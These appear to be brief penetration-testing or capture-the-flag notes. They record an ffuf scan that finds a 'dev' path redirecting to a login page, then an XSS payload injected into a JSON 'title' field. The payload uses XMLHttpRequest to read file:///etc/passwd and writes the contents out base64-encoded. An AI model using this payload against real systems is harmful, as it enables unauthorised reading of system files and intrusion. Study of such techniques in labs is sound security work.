FFUF scan:
```
dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 1061ms]
```

Leads to login page



Got XSS:
```
"title":"<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open('GET','file:///etc/passwd');x.send();</script>",
```